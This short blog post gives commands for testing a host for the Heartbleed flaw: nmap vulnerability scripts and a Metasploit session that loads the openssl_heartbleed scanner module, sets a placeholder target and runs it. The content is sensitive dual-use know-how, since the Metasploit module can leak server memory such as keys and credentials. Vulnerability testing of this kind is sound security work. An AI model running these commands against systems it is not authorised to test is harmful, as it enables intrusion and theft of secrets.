---
title: "Heart bleed testing with nmap or msfconsole"
date: 2024-09-07
author: pengjianqing
categories: ['Cryptography', 'Tech']
tags: ['Cryptography', 'heartbleeding', 'msfconsole']
---

![](../images/a61db4e6.jpg)

## nmap

```
`sudo nmap --script vuln -p443 host
sudo nmap -sV --script=ssl-heartbleed host
`
```

## msfconsole

```
`msfconsole 
search heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
options
set RHOSTS xx.xx.xx.xx
set VERBOSE true
exploit
run
`
```